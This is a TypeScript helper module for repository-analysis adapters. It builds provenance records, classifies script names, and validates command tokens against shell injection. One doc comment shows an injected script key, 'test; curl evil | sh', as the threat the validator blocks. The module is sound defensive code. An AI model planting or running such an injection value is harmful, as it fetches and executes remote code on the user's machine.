/**
 * Small builders for adapter authors.
 *
 * These exist so the common case - "I found something, here is where" - is one
 * line, and so the mandatory provenance fields cannot be forgotten. An adapter
 * that constructs claims by hand is free to do so; nothing here is required.
 */

import type { Provenance, ProvenanceTier, SourceRef, Timestamp } from "@project-surface/core";

export interface ProvenanceInput {
  tier: ProvenanceTier;
  adapter: string;
  now: Timestamp;
  sources: Array<SourceRef | string>;
}

/**
 * Whether a name read from a manifest may be interpolated into a command line.
 *
 * Script names, binary names and package managers come from repository
 * content, and `run` strings are executed through a shell by the evidence
 * runner. A script key such as `"test; curl evil | sh"` is legal JSON, so
 * adapters must refuse anything beyond the characters real tools use.
 */
export function isSafeCommandToken(name: string): boolean {
  return /^[A-Za-z0-9][A-Za-z0-9_.:@+\/-]{0,127}$/.test(name);
}

export function source(path: string, locator?: string): SourceRef {
  return locator === undefined ? { path } : { path, locator };
}

export function provenance(input: ProvenanceInput): Provenance {
  const sources = input.sources.map((s) => (typeof s === "string" ? { path: s } : s));
  if (sources.length === 0) {
    throw new Error(
      `Adapter "${input.adapter}" tried to build a claim with no sources. ` +
        `Every claim must name at least one file it came from.`
    );
  }
  return { tier: input.tier, sources, adapter: input.adapter, observedAt: input.now };
}

/**
 * Classify an npm-style script name into a command kind. Shared because every
 * adapter that reads a script table needs the same mapping, and inconsistent
 * classification across adapters makes `surface verify` unpredictable.
 */
export function classifyCommand(name: string): import("@project-surface/core").CommandKind {
  const n = name.toLowerCase();
  if (/^(test|tests|spec|check:test|unit|jest|vitest|pytest)(:|$)/.test(n)) return "test";
  if (/^(build|compile|bundle|dist)(:|$)/.test(n)) return "build";
  if (/^(dev|serve|watch|start:dev)(:|$)/.test(n)) return "dev";
  if (/^(lint|eslint|ruff|clippy|vet)(:|$)/.test(n)) return "lint";
  if (/^(typecheck|types|tsc|mypy)(:|$)/.test(n)) return "typecheck";
  if (/^(format|fmt|prettier|black)(:|$)/.test(n)) return "format";
  if (/^(start|serve:prod|run)(:|$)/.test(n)) return "start";
  if (/(migrate|migration)/.test(n)) return "migrate";
  return "other";
}
